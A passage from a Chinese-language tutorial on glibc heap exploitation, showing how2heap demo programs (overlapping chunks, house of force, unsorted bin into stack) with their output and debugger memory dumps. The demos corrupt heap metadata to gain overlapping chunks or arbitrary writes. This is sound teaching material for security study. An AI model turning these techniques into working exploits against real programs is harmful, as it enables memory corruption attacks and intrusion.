0x6020c0: 0x4141414141414141 0x4141414141414141 0x6020d0: 0x4141414141414141 0x4141414141414141 0x6020e0: 0x4141414141414141 0x4141414141414141 0x6020f0: 0x4141414141414141 0x4141414141414141 0x602100: 0x4141414141414141 0x4141414141414141 0x602110: 0x4141414141414141 0x4141414141414141 0x602120: 0x0000000000000090 0x0000000000000080 <-- chunk 3 0x602130: 0x4141414141414141 0x4141414141414141 0x602140: 0x4141414141414141 0x4141414141414141 0x602150: 0x4141414141414141 0x4141414141414141 0x602160: 0x4141414141414141 0x4141414141414141 0x602170: 0x4141414141414141 0x4141414141414141 0x602180: 0x4141414141414141 0x4141414141414141 0x602190: 0x4141414141414141 0x4141414141414141 0x6021a0: 0x4141414141414141 0x0000000000020e61 <-- top chunk 0x6021b0: 0x0000000000000000 0x0000000000000000 0x6021c0: 0x0000000000000000 0x0000000000000000 0x6021d0: 0x0000000000000000 0x0000000000000000 \u8fd9\u6837\uff0c\u76f8\u5f53\u4e8e chunk 4 \u548c chunk 3 \u5c31\u91cd\u53e0\u4e86\uff0c\u4e24\u4e2a chunk \u53ef\u4ee5\u4e92\u76f8\u4fee\u6539\u5bf9\u65b9\u7684\u6570\u636e\u3002\u5c31\u50cf\u4e0a\u9762\u7684\u8fd0\u884c\u7ed3\u679c\u6253\u5370\u51fa\u6765\u7684\u90a3\u6837\u3002 overlapping_chunks_2 #include <stdio.h> #include <stdlib.h> #include <string.h> #include <stdint.h> #include <malloc.h> int main() { intptr_t *p1,*p2,*p3,*p4,*p5,*p6; unsigned int real_size_p1,real_size_p2,real_size_p3,real_size_p4,real_size_p5,real_size_p6; int prev_in_use = 0x1; p1 = malloc(0x10); p2 = malloc(0x80); p3 = malloc(0x80); p4 = malloc(0x80); p5 = malloc(0x10); real_size_p1 = malloc_usable_size(p1); real_size_p2 = malloc_usable_size(p2); real_size_p3 = malloc_usable_size(p3); real_size_p4 = malloc_usable_size(p4); real_size_p5 = malloc_usable_size(p5); memset(p1, 'A', real_size_p1); memset(p2, 'A', real_size_p2); memset(p3, 'A', real_size_p3); memset(p4, 'A', real_size_p4); memset(p5, 'A', real_size_p5); fprintf(stderr, \"Now we allocate 5 chunks on the heap\\n\\n\"); fprintf(stderr, \"chunk p1: %p ~ %p\\n\", p1, (unsigned char *)p1+malloc_usable_size(p1)); fprintf(stderr, \"chunk p2: %p ~ %p\\n\", p2, (unsigned char *)p2+malloc_usable_size(p2)); fprintf(stderr, \"chunk p3: %p ~ %p\\n\", p3, (unsigned char *)p3+malloc_usable_size(p3)); fprintf(stderr, \"chunk p4: %p ~ %p\\n\", p4, (unsigned char *)p4+malloc_usable_size(p4)); fprintf(stderr, \"chunk p5: %p ~ %p\\n\", p5, (unsigned char *)p5+malloc_usable_size(p5)); free(p4); fprintf(stderr, \"\\nLet's free the chunk p4\\n\\n\"); fprintf(stderr, \"Emulating an overflow that can overwrite the size of chunk p2 with (size of chunk_p2 + size of chunk_p3)\\n\\n\"); *(unsigned int *)((unsigned char *)p1 + real_size_p1) = real_size_p2 + real_size_p3 + prev_in_use + sizeof(size_t) * 2; // BUG HERE free(p2); p6 = malloc(0x1b0 - 0x10); real_size_p6 = malloc_usable_size(p6); fprintf(stderr, \"Allocating a new chunk 6: %p ~ %p\\n\\n\", p6, (unsigned char *)p6+real_size_p6); fprintf(stderr, \"Now p6 and p3 are overlapping, if we memset(p6, 'B', 0xd0)\\n\"); fprintf(stderr, \"p3 before = %s\\n\", (char *)p3); memset(p6, 'B', 0xd0); fprintf(stderr, \"p3 after = %s\\n\", (char *)p3); } $ gcc -g overlapping_chunks_2.c $ ./a.out Now we allocate 5 chunks on the heap chunk p1: 0x18c2010 ~ 0x18c2028 chunk p2: 0x18c2030 ~ 0x18c20b8 chunk p3: 0x18c20c0 ~ 0x18c2148 chunk p4: 0x18c2150 ~ 0x18c21d8 chunk p5: 0x18c21e0 ~ 0x18c21f8 Let's free the chunk p4 Emulating an overflow that can overwrite the size of chunk p2 with (size of chunk_p2 + size of chunk_p3) Allocating a new chunk 6: 0x18c2030 ~ 0x18c21d8 Now p6 and p3 are overlapping, if we memset(p6, 'B', 0xd0) p3 before = AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\ufffd p3 after = BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\ufffd \u540c\u6837\u662f\u5806\u5757\u91cd\u53e0\u7684\u95ee\u9898\uff0c\u524d\u9762\u90a3\u4e2a\u662f\u5728 chunk \u5df2\u7ecf\u88ab free\uff0c\u52a0\u5165\u5230\u4e86 unsorted bin \u4e4b\u540e\uff0c\u518d\u4fee\u6539\u5176 size \u503c\uff0c\u7136\u540e malloc \u4e00\u4e2a\u4e0d\u4e00\u6837\u7684 chunk \u51fa\u6765\uff0c\u800c\u8fd9\u91cc\u662f\u5728 free \u4e4b\u524d\u4fee\u6539 size \u503c\uff0c\u4f7f free \u9519\u8bef\u5730\u4fee\u6539\u4e86\u4e0b\u4e00\u4e2a chunk \u7684 prev_size \u503c\uff0c\u5bfc\u81f4\u4e2d\u95f4\u7684 chunk \u5f3a\u884c\u5408\u5e76\u3002\u53e6\u5916\u524d\u9762\u90a3\u4e2a\u91cd\u53e0\u662f\u76f8\u90bb\u5806\u5757\u4e4b\u95f4\u7684\uff0c\u800c\u8fd9\u91cc\u662f\u4e0d\u76f8\u90bb\u5806\u5757\u4e4b\u95f4\u7684\u3002 \u6211\u4eec\u9700\u8981\u4e94\u4e2a\u5806\u5757\uff0c\u5047\u8bbe\u7b2c chunk 1 \u5b58\u5728\u6ea2\u51fa\uff0c\u53ef\u4ee5\u6539\u5199\u7b2c\u4e8c\u4e2a chunk 2 \u7684\u6570\u636e\uff0cchunk 5 \u7684\u4f5c\u7528\u662f\u9632\u6b62\u91ca\u653e chunk 4 \u540e\u88ab\u5408\u5e76\u8fdb top chunk\u3002\u6240\u4ee5\u6211\u4eec\u8981\u91cd\u53e0\u7684\u533a\u57df\u662f chunk 2 \u5230 chunk 4\u3002\u9996\u5148\u5c06 chunk 4 \u91ca\u653e\u6389\uff0c\u6ce8\u610f\u770b chunk 5 \u7684 prev_size \u503c\uff1a gef\u27a4 x/70gx 0x602010-0x10 0x602000: 0x0000000000000000 0x0000000000000021 <-- chunk 1 0x602010: 0x4141414141414141 0x4141414141414141 0x602020: 0x4141414141414141 0x0000000000000091 <-- chunk 2 0x602030: 0x4141414141414141 0x4141414141414141 0x602040: 0x4141414141414141 0x4141414141414141 0x602050: 0x4141414141414141 0x4141414141414141 0x602060: 0x4141414141414141 0x4141414141414141 0x602070: 0x4141414141414141 0x4141414141414141 0x602080: 0x4141414141414141 0x4141414141414141 0x602090: 0x4141414141414141 0x4141414141414141 0x6020a0: 0x4141414141414141 0x4141414141414141 0x6020b0: 0x4141414141414141 0x0000000000000091 <-- chunk 3 0x6020c0: 0x4141414141414141 0x4141414141414141 0x6020d0: 0x4141414141414141 0x4141414141414141 0x6020e0: 0x4141414141414141 0x4141414141414141 0x6020f0: 0x4141414141414141 0x4141414141414141 0x602100: 0x4141414141414141 0x4141414141414141 0x602110: 0x4141414141414141 0x4141414141414141 0x602120: 0x4141414141414141 0x4141414141414141 0x602130: 0x4141414141414141 0x4141414141414141 0x602140: 0x4141414141414141 0x0000000000000091 <-- chunk 4 [be freed] 0x602150: 0x00007ffff7dd1b78 0x00007ffff7dd1b78 <-- fd, bk pointer 0x602160: 0x4141414141414141 0x4141414141414141 0x602170: 0x4141414141414141 0x4141414141414141 0x602180: 0x4141414141414141 0x4141414141414141 0x602190: 0x4141414141414141 0x4141414141414141 0x6021a0: 0x4141414141414141 0x4141414141414141 0x6021b0: 0x4141414141414141 0x4141414141414141 0x6021c0: 0x4141414141414141 0x4141414141414141 0x6021d0: 0x0000000000000090 0x0000000000000020 <-- chunk 5 <-- prev_size 0x6021e0: 0x4141414141414141 0x4141414141414141 0x6021f0: 0x4141414141414141 0x0000000000020e11 <-- top chunk 0x602200: 0x0000000000000000 0x0000000000000000 0x602210: 0x0000000000000000 0x0000000000000000 0x602220: 0x0000000000000000 0x0000000000000000 gef\u27a4 heap bins unsorted [ Unsorted Bin for arena 'main_arena' ] [+] unsorted_bins[0]: fw=0x602140, bk=0x602140 \u2192 Chunk(addr=0x602150, size=0x90, flags=PREV_INUSE) free chunk 4 \u88ab\u653e\u5165 unsorted bin\uff0c\u5927\u5c0f\u4e3a 0x90\u3002 \u63a5\u4e0b\u6765\u662f\u6700\u5173\u952e\u7684\u4e00\u6b65\uff0c\u5229\u7528 chunk 1 \u7684\u6ea2\u51fa\u6f0f\u6d1e\uff0c\u5c06 chunk 2 \u7684 size \u503c\u4fee\u6539\u4e3a chunk 2 \u548c chunk 3 \u7684\u5927\u5c0f\u4e4b\u548c\uff0c\u5373 0x90+0x90+0x1=0x121\uff0c\u6700\u540e\u7684 1 \u662f\u6807\u5fd7\u4f4d\u3002\u8fd9\u6837\u5f53\u6211\u4eec\u91ca\u653e chunk 2 \u7684\u65f6\u5019\uff0cmalloc \u6839\u636e\u8fd9\u4e2a\u88ab\u4fee\u6539\u7684 size \u503c\uff0c\u4f1a\u4ee5\u4e3a chunk 2 \u52a0\u4e0a chunk 3 \u7684\u533a\u57df\u90fd\u662f\u8981\u91ca\u653e\u7684\uff0c\u7136\u540e\u5c31\u9519\u8bef\u5730\u4fee\u6539\u4e86 chunk 5 \u7684 prev_size\u3002\u63a5\u7740\uff0c\u5b83\u53d1\u73b0\u7d27\u90bb\u7684\u4e00\u5757 chunk 4 \u4e5f\u662f free \u72b6\u6001\uff0c\u5c31\u628a\u5b83\u4fe9\u5408\u5e76\u5728\u4e86\u4e00\u8d77\uff0c\u7ec4\u6210\u4e00\u4e2a\u5927 free chunk\uff0c\u653e\u8fdb unsorted bin \u4e2d\u3002 gef\u27a4 x/70gx 0x602010-0x10 0x602000: 0x0000000000000000 0x0000000000000021 <-- chunk 1 0x602010: 0x4141414141414141 0x4141414141414141 0x602020: 0x4141414141414141 0x00000000000001b1 <-- chunk 2 [be freed] <-- unsorted bin 0x602030: 0x00007ffff7dd1b78 0x00007ffff7dd1b78 <-- fd, bk pointer 0x602040: 0x4141414141414141 0x4141414141414141 0x602050: 0x4141414141414141 0x4141414141414141 0x602060: 0x4141414141414141 0x4141414141414141 0x602070: 0x4141414141414141 0x4141414141414141 0x602080: 0x4141414141414141 0x4141414141414141 0x602090: 0x4141414141414141 0x4141414141414141 0x6020a0: 0x4141414141414141 0x4141414141414141 0x6020b0: 0x4141414141414141 0x0000000000000091 <-- chunk 3 0x6020c0: 0x4141414141414141 0x4141414141414141 0x6020d0: 0x4141414141414141 0x4141414141414141 0x6020e0: 0x4141414141414141 0x4141414141414141 0x6020f0: 0x4141414141414141 0x4141414141414141 0x602100: 0x4141414141414141 0x4141414141414141 0x602110: 0x4141414141414141 0x4141414141414141 0x602120: 0x4141414141414141 0x4141414141414141 0x602130: 0x4141414141414141 0x4141414141414141 0x602140: 0x4141414141414141 0x0000000000000091 <-- chunk 4 [be freed] 0x602150: 0x00007ffff7dd1b78 0x00007ffff7dd1b78 0x602160: 0x4141414141414141 0x4141414141414141 0x602170: 0x4141414141414141 0x4141414141414141 0x602180: 0x4141414141414141 0x4141414141414141 0x602190: 0x4141414141414141 0x4141414141414141 0x6021a0: 0x4141414141414141 0x4141414141414141 0x6021b0: 0x4141414141414141 0x4141414141414141 0x6021c0: 0x4141414141414141 0x4141414141414141 0x6021d0: 0x00000000000001b0 0x0000000000000020 <-- chunk 5 <-- prev_size 0x6021e0: 0x4141414141414141 0x4141414141414141 0x6021f0: 0x4141414141414141 0x0000000000020e11 <-- top chunk 0x602200: 0x0000000000000000 0x0000000000000000 0x602210: 0x0000000000000000 0x0000000000000000 0x602220: 0x0000000000000000 0x0000000000000000 gef\u27a4 heap bins unsorted [ Unsorted Bin for arena 'main_arena' ] [+] unsorted_bins[0]: fw=0x602020, bk=0x602020 \u2192 Chunk(addr=0x602030, size=0x1b0, flags=PREV_INUSE) \u73b0\u5728 unsorted bin \u91cc\u7684 chunk \u7684\u5927\u5c0f\u4e3a 0x1b0\uff0c\u5373 0x90*3\u3002\u54a6\uff0c\u6240\u4ee5 chunk 3 \u867d\u7136\u662f\u4f7f\u7528\u72b6\u6001\uff0c\u4f46\u4e5f\u88ab\u5f3a\u884c\u7b97\u5728\u4e86 free chunk \u7684\u7a7a\u95f4\u91cc\u4e86\u3002 \u6700\u540e\uff0c\u5982\u679c\u6211\u4eec\u5206\u914d\u4e00\u5757\u5927\u5c0f\u4e3a 0x1b0-0x10 \u7684\u5927\u7a7a\u95f4\uff0c\u8fd4\u56de\u7684\u5806\u5757\u5373\u662f\u5305\u62ec\u4e86 chunk 2 + chunk 3 + chunk 4 \u7684\u5927 chunk\u3002\u8fd9\u65f6 chunk 6 \u548c chunk 3 \u5c31\u91cd\u53e0\u4e86\uff0c\u7ed3\u679c\u5c31\u50cf\u4e0a\u9762\u8fd0\u884c\u65f6\u6253\u5370\u51fa\u6765\u7684\u4e00\u6837\u3002 3.1.8 Linux \u5806\u5229\u7528\uff08\u4e0b\uff09 how2heap house_of_force unsorted_bin_into_stack unsorted_bin_attack house_of_einherjar house_of_orange \u53c2\u8003\u8d44\u6599 \u4e0b\u8f7d\u6587\u4ef6 how2heap house_of_force #include <stdio.h> #include <stdint.h> #include <stdlib.h> #include <string.h> #include <stdint.h> #include <malloc.h> char bss_var[] = \"This is a string that we want to overwrite.\"; int main() { fprintf(stderr, \"We will overwrite a variable at %p\\n\\n\", bss_var); intptr_t *p1 = malloc(0x10); int real_size = malloc_usable_size(p1); memset(p1, 'A', real_size); fprintf(stderr, \"Let's allocate the first chunk of 0x10 bytes: %p.\\n\", p1); fprintf(stderr, \"Real size of our allocated chunk is 0x%x.\\n\\n\", real_size); intptr_t *ptr_top = (intptr_t *) ((char *)p1 + real_size); fprintf(stderr, \"Overwriting the top chunk size with a big value so the malloc will never call mmap.\\n\"); fprintf(stderr, \"Old size of top chunk: %#llx\\n\", *((unsigned long long int *)ptr_top)); ptr_top[0] = -1; fprintf(stderr, \"New size of top chunk: %#llx\\n\", *((unsigned long long int *)ptr_top)); unsigned long evil_size = (unsigned long)bss_var - sizeof(long)*2 - (unsigned long)ptr_top; fprintf(stderr, \"\\nThe value we want to write to at %p, and the top chunk is at %p, so accounting for the header size, we will malloc %#lx bytes.\\n\", bss_var, ptr_top, evil_size); void *new_ptr = malloc(evil_size); int real_size_new = malloc_usable_size(new_ptr); memset((char *)new_ptr + real_size_new - 0x20, 'A', 0x20); fprintf(stderr, \"As expected, the new pointer is at the same place as the old top chunk: %p\\n\", new_ptr); void* ctr_chunk = malloc(0x30); fprintf(stderr, \"malloc(0x30) => %p!\\n\", ctr_chunk); fprintf(stderr, \"\\nNow, the next chunk we overwrite will point at our target buffer, so we can overwrite the value.\\n\"); fprintf(stderr, \"old string: %s\\n\", bss_var); strcpy(ctr_chunk, \"YEAH!!!\"); fprintf(stderr, \"new string: %s\\n\", bss_var); } $ gcc -g house_of_force.c $ ./a.out We will overwrite a variable at 0x601080 Let's allocate the first chunk of 0x10 bytes: 0x824010. Real size of our allocated chunk is 0x18. Overwriting the top chunk size with a big value so the malloc will never call mmap. Old size of top chunk: 0x20fe1 New size of top chunk: 0xffffffffffffffff The value we want to write to at 0x601080, and the top chunk is at 0x824028, so accounting for the header size, we will malloc 0xffffffffffddd048 bytes. As expected, the new pointer is at the same place as the old top chunk: 0x824030 malloc(0x30) => 0x601080! Now, the next chunk we overwrite will point at our target buffer, so we can overwrite the value. old string: This is a string that we want to overwrite. new string: YEAH!!! house_of_force \u662f\u4e00\u79cd\u901a\u8fc7\u6539\u5199 top chunk \u7684 size \u5b57\u6bb5\u6765\u6b3a\u9a97 malloc \u8fd4\u56de\u4efb\u610f\u5730\u5740\u7684\u6280\u672f\u3002\u6211\u4eec\u77e5\u9053\u5728\u7a7a\u95f2\u5185\u5b58\u7684\u6700\u9ad8\u5904\uff0c\u5fc5\u7136\u5b58\u5728\u4e00\u5757\u7a7a\u95f2\u7684 chunk\uff0c\u5373 top chunk\uff0c\u5f53 bins \u548c fast bins \u90fd\u4e0d\u80fd\u6ee1\u8db3\u5206\u914d\u9700\u8981\u7684\u65f6\u5019\uff0cmalloc \u4f1a\u4ece top chunk \u4e2d\u5206\u51fa\u4e00\u5757\u5185\u5b58\u7ed9\u7528\u6237\u3002\u6240\u4ee5 top chunk \u7684\u5927\u5c0f\u4f1a\u968f\u7740\u5206\u914d\u548c\u56de\u6536\u4e0d\u505c\u5730\u53d8\u5316\u3002\u8fd9\u79cd\u653b\u51fb\u5047\u8bbe\u6709\u4e00\u4e2a\u6ea2\u51fa\u6f0f\u6d1e\uff0c\u53ef\u4ee5\u6539\u5199 top chunk \u7684\u5934\u90e8\uff0c\u7136\u540e\u5c06\u5176\u6539\u4e3a\u4e00\u4e2a\u975e\u5e38\u5927\u7684\u503c\uff0c\u4ee5\u786e\u4fdd\u6240\u6709\u7684 malloc \u5c06\u4f7f\u7528 top chunk \u5206\u914d\uff0c\u800c\u4e0d\u4f1a\u8c03\u7528 mmap\u3002\u8fd9\u65f6\u5982\u679c\u653b\u51fb\u8005 malloc \u4e00\u4e2a\u5f88\u5927\u7684\u6570\u76ee\uff08\u8d1f\u6709\u7b26\u53f7\u6574\u6570\uff09\uff0ctop chunk \u7684\u4f4d\u7f6e\u52a0\u4e0a\u8fd9\u4e2a\u5927\u6570\uff0c\u9020\u6210\u6574\u6570\u6ea2\u51fa\uff0c\u7ed3\u679c\u662f top chunk \u80fd\u591f\u88ab\u8f6c\u79fb\u5230\u5806\u4e4b\u524d\u7684\u5185\u5b58\u5730\u5740\uff08\u5982\u7a0b\u5e8f\u7684 .bss \u6bb5\u3001.data \u6bb5\u3001GOT \u8868\u7b49\uff09\uff0c\u4e0b\u6b21\u518d\u6267\u884c malloc \u65f6\uff0c\u653b\u51fb\u8005\u5c31\u80fd\u591f\u63a7\u5236\u8f6c\u79fb\u4e4b\u540e\u5730\u5740\u5904\u7684\u5185\u5b58\u3002 \u9996\u5148\u968f\u610f\u5206\u914d\u4e00\u4e2a chunk\uff0c\u6b64\u65f6\u5185\u5b58\u91cc\u5b58\u5728\u4e24\u4e2a chunk\uff0c\u5373 chunk 1 \u548c top chunk\uff1a gef\u27a4 x/8gx 0x602010-0x10 0x602000: 0x0000000000000000 0x0000000000000021 <-- chunk 1 0x602010: 0x4141414141414141 0x4141414141414141 0x602020: 0x4141414141414141 0x0000000000020fe1 <-- top chunk 0x602030: 0x0000000000000000 0x0000000000000000 chunk 1 \u771f\u5b9e\u53ef\u7528\u7684\u5185\u5b58\u6709 0x18 \u5b57\u8282\u3002 \u5047\u8bbe chunk 1 \u5b58\u5728\u6ea2\u51fa\uff0c\u5229\u7528\u8be5\u6f0f\u6d1e\u6211\u4eec\u73b0\u5728\u5c06 top chunk \u7684 size \u503c\u6539\u4e3a\u4e00\u4e2a\u975e\u5e38\u5927\u7684\u6570\uff1a gef\u27a4 x/8gx 0x602010-0x10 0x602000: 0x0000000000000000 0x0000000000000021 <-- chunk 1 0x602010: 0x4141414141414141 0x4141414141414141 0x602020: 0x4141414141414141 0xffffffffffffffff <-- modified top chunk 0x602030: 0x0000000000000000 0x0000000000000000 \u6539\u5199\u4e4b\u540e\u7684 size==0xffffffff\u3002 \u73b0\u5728\u6211\u4eec\u53ef\u4ee5 malloc \u4e00\u4e2a\u4efb\u610f\u5927\u5c0f\u7684\u5185\u5b58\u800c\u4e0d\u7528\u8c03\u7528 mmap \u4e86\u3002\u63a5\u4e0b\u6765 malloc \u4e00\u4e2a chunk\uff0c\u4f7f\u5f97\u8be5 chunk \u521a\u597d\u5206\u914d\u5230\u6211\u4eec\u60f3\u8981\u63a7\u5236\u7684\u90a3\u5757\u533a\u57df\u4e3a\u6b62\uff0c\u8fd9\u6837\u5728\u4e0b\u4e00\u6b21 malloc \u65f6\uff0c\u5c31\u53ef\u4ee5\u8fd4\u56de\u5230\u6211\u4eec\u60f3\u8981\u63a7\u5236\u7684\u533a\u57df\u4e86\u3002\u8ba1\u7b97\u65b9\u6cd5\u662f\u7528\u76ee\u6807\u5730\u5740\u51cf\u53bb top chunk \u5730\u5740\uff0c\u518d\u51cf\u53bb chunk \u5934\u7684\u5927\u5c0f\u3002 gef\u27a4 x/8gx 0x602010-0x10 0x602000: 0x0000000000000000 0x0000000000000021 0x602010: 0x4141414141414141 0x4141414141414141 0x602020: 0x4141414141414141 0xfffffffffffff051 0x602030: 0x0000000000000000 0x0000000000000000 gef\u27a4 x/12gx 0x602010+0xfffffffffffff050 0x601060: 0x4141414141414141 0x4141414141414141 0x601070: 0x4141414141414141 0x0000000000000fa9 <-- top chunk 0x601080 <bss_var>: 0x2073692073696854 0x676e697274732061 <-- target 0x601090 <bss_var+16>: 0x6577207461687420 0x6f7420746e617720 0x6010a0 <bss_var+32>: 0x6972777265766f20 0x00000000002e6574 0x6010b0: 0x0000000000000000 0x0000000000000000 \u518d\u6b21 malloc\uff0c\u5c06\u76ee\u6807\u5730\u5740\u5305\u542b\u8fdb\u6765\u5373\u53ef\uff0c\u73b0\u5728\u6211\u4eec\u5c31\u6210\u529f\u63a7\u5236\u4e86\u76ee\u6807\u5185\u5b58\uff1a gef\u27a4 x/12gx 0x602010+0xfffffffffffff050 0x601060: 0x4141414141414141 0x4141414141414141 0x601070: 0x4141414141414141 0x0000000000000041 <-- chunk 2 0x601080 <bss_var>: 0x2073692073696854 0x676e697274732061 <-- target 0x601090 <bss_var+16>: 0x6577207461687420 0x6f7420746e617720 0x6010a0 <bss_var+32>: 0x6972777265766f20 0x00000000002e6574 0x6010b0: 0x0000000000000000 0x0000000000000f69 <-- top chunk \u8be5\u6280\u672f\u7684\u7f3a\u70b9\u662f\u4f1a\u53d7\u5230 ASLR \u7684\u5f71\u54cd\uff0c\u56e0\u4e3a\u5982\u679c\u653b\u51fb\u8005\u9700\u8981\u4fee\u6539\u6307\u5b9a\u4f4d\u7f6e\u7684\u5185\u5b58\uff0c\u4ed6\u9996\u5148\u9700\u8981\u77e5\u9053\u5f53\u524d top chunk \u7684\u4f4d\u7f6e\u4ee5\u6784\u9020\u5408\u9002\u7684 malloc \u5927\u5c0f\u6765\u8f6c\u79fb top chunk\u3002\u800c ASLR \u5c06\u4f7f\u5806\u5185\u5b58\u5730\u5740\u968f\u673a\uff0c\u6240\u4ee5\u8be5\u6280\u672f\u8fd8\u9700\u540c\u65f6\u914d\u5408\u4f7f\u7528\u4fe1\u606f\u6cc4\u6f0f\u4ee5\u8fbe\u6210\u653b\u51fb\u3002 unsorted_bin_into_stack #include <stdio.h> #include <stdlib.h> int main() { unsigned long stack_buf[4] = {0}; unsigned long *victim = malloc(0x80); unsigned long *p1 = malloc(0x10); fprintf(stderr, \"Allocating the victim chunk at %p\\n\", victim); // deal with tcache // int *k[10], i; // for (i = 0; i < 7; i++) { // k[i] = malloc(0x80); // } // for (i = 0; i < 7; i++) { // free(k[i]); // } free(victim); fprintf(stderr, \"Freeing the chunk, it will be inserted in the unsorted bin\\n\\n\"); stack_buf[1] = 0x100 + 0x10; stack_buf[3] = (unsigned long)stack_buf; // or any other writable address fprintf(stderr, \"Create a fake chunk on the stack\\n\"); fprintf(stderr, \"fake->size: %p\\n\", (void *)stack_buf[1]); fprintf(stderr, \"fake->bk: %p\\n\\n\", (void *)stack_buf[3]); victim[1] = (unsigned long)stack_buf; fprintf(stderr, \"Now we overwrite the victim->bk pointer to stack: %p\\n\\n\", stack_buf); fprintf(stderr, \"Malloc a chunk which size is 0x110 will return the region of our fake chunk: %p\\n\", &stack_buf[2]); unsigned long *fake = malloc(0x100); fprintf(stderr, \"malloc(0x100): %p\\n\", fake); } $ gcc -g unsorted_bin_into_stack.c $ ./a.out Allocating the victim chunk at 0x17a1010 Freeing the chunk, it will be inserted in the unsorted bin Create a fake chunk on the stack fake->size: 0x110 fake->bk: 0x7fffcd906480 Now we overwrite the victim->bk pointer to stack: 0x7fffcd906480 Malloc a chunk which size is 0x110 will return the region of our fake chunk: 0x7fffcd906490 malloc(0x100): 0x7fffcd906490 unsorted-bin-into-stack \u901a\u8fc7\u6539\u5199 unsorted bin \u91cc chunk \u7684 bk \u6307\u9488\u5230\u4efb\u610f\u5730\u5740\uff0c\u4ece\u800c\u5728\u6808\u4e0a malloc \u51fa chunk\u3002 \u9996\u5148\u5c06\u4e00\u4e2a chunk \u653e\u5165 unsorted bin\uff0c\u5e76\u4e14\u5728\u6808\u4e0a\u4f2a\u9020\u4e00\u4e2a chunk\uff1a gdb-peda$ x/6gx victim - 2 0x602000: 0x0000000000000000 0x0000000000000091 <-- victim chunk 0x602010: 0x00007ffff7dd1b78 0x00007ffff7dd1b78 0x602020: 0x0000000000000000 0x0000000000000000 gdb-peda$ x/4gx stack_buf 0x7fffffffdbc0: 0x0000000000000000 0x0000000000000110 <-- fake chunk 0x7fffffffdbd0: 0x0000000000000000 0x00007fffffffdbc0 \u7136\u540e\u5047\u8bbe\u6709\u4e00\u4e2a\u6f0f\u6d1e\uff0c\u53ef\u4ee5\u6539\u5199 victim chunk \u7684 bk \u6307\u9488\uff0c\u90a3\u4e48\u5c06\u5176\u6539\u4e3a\u6307\u5411 fake chunk\uff1a gdb-peda$ x/6gx victim - 2 0x602000: 0x0000000000000000 0x0000000000000091 <-- victim chunk 0x602010: 0x00007ffff7dd1b78 0x00007fffffffdbc0 <-- bk pointer 0x602020: 0x0000000000000000 0x0000000000000000 gdb-peda$ x/4gx stack_buf 0x7fffffffdbc0: 0x0000000000000000 0x0000000000000110 <-- fake chunk 0x7fffffffdbd0: 0x0000000000000000 0x00007fffffffdbc0 \u90a3\u4e48\u6b64\u65f6\u5c31\u76f8\u5f53\u4e8e fake chunk \u5df2\u7ecf\u88ab\u94fe\u63a5\u5230 unsorted bin \u4e2d\u3002\u5728\u4e0b\u4e00\u6b21 malloc \u7684\u65f6\u5019\uff0cmalloc \u4f1a\u987a\u7740 bk \u6307\u9488\u8fdb\u884c\u904d\u5386\uff0c\u4e8e\u662f\u5c31\u627e\u5230\u4e86\u5927\u5c0f\u6b63\u597d\u5408\u9002\u7684 fake chunk\uff1a gdb-peda$ x/6gx victim - 2 0x602000: 0x0000000000000000 0x0000000000000091 <-- victim chunk 0x602010: 0x00007ffff7dd1bf8 0x00007ffff7dd1bf8 0x602020: 0x0000000000000000 0x0000000000000000 gdb-peda$ x/4gx fake - 2 0x7fffffffdbc0: 0x0000000000000000 0x0000000000000110 <-- fake chunk 0x7fffffffdbd0: 0x00007ffff7dd1b78 0x00007fffffffdbc0 fake chunk \u88ab\u53d6\u51fa\uff0c\u800c victim chunk \u88ab\u4ece unsorted bin \u4e2d\u53d6\u51fa\u6765\u653e\u5230\u4e86 small bin \u4e2d\u3002\u53e6\u5916\u503c\u5f97\u6ce8\u610f\u7684\u662f fake chunk \u7684 fd \u6307\u9488\u88ab\u4fee\u6539\u4e86\uff0c\u8fd9\u662f unsorted bin \u7684\u5730\u5740\uff0c\u901a\u8fc7\u5b83\u53ef\u4ee5\u6cc4\u9732 libc \u5730\u5740\uff0c\u8fd9\u6b63\u662f\u4e0b\u9762 unsorted bin attack \u4f1a\u8bb2\u5230\u7684\u3002 \u5c06\u4e0a\u9762\u7684\u4ee3\u7801\u89e3\u9664\u6ce8\u91ca\uff0c\u5c31\u662f libc-2.27 \u73af\u5883\u4e0b\u7684\u7248\u672c\uff0c\u4f46\u662f\u9700\u8981\u6ce8\u610f\u7684\u662f\u7531\u4e8e tcache \u7684\u5f71\u54cd\uff0c stack_buf[3] \u4e0d\u80fd\u518d\u8bbe\u7f6e\u6210\u4efb\u610f\u5730\u5740\u3002 malloc \u524d\uff1a gdb-peda$ x/6gx victim - 2 0x555555756250: 0x0000000000000000 0x0000000000000091 <-- victim chunk 0x555555756260: 0x00007ffff7dd2b00 0x00007fffffffdcb0 0x555555756270: 0x0000000000000000 0x0000000000000000 gdb-peda$ x/4gx stack_buf 0x7fffffffdcb0: 0x0000000000000000 0x0000000000000110 <-- fake chunk 0x7fffffffdcc0: 0x0000000000000000 0x00007fffffffdcb0 gdb-peda$ x/26gx 0x0000555555756000+0x10 0x555555756010: 0x0700000000000000 0x0000000000000000 <-- counts 0x555555756020: 0x0000000000000000 0x0000000000000000 0x555555756030: 0x0000000000000000 0x0000000000000000 0x555555756040: 0x0000000000000000 0x0000000000000000 0x555555756050: 0x0000000000000000 0x0000000000000000 0x555555756060: 0x0000000000000000 0x0000000000000000 0x555555756070: 0x0000000000000000 0x0000000000000000 0x555555756080: 0x0000000000000000 0x0000555555756670 <-- entries 0x555555756090: 0x0000000000000000 0x0000000000000000 0x5555557560a0: 0x0000000000000000 0x0000000000000000 0x5555557560b0: 0x0000000000000000 0x0000000000000000 0x5555557560c0: 0x0000000000000000 0x0000000000000000 0x5555557560d0: 0x0000000000000000 0x0000000000000000 malloc \u540e\uff1a gdb-peda$ x/6gx victim - 2 0x555555756250: 0x0000000000000000 0x0000000000000091 <-- victim chunk 0x555555756260: 0x00007ffff7dd2b80 0x00007ffff7dd2b80 0x555555756270: 0x0000000000000000 0x0000000000000000 gdb-peda$ x/4gx fake - 2 0x7fffffffdcb0: 0x0000000000000000 0x0000000000000110 <-- fake chunk 0x7fffffffdcc0: 0x00007ffff7dd2b00 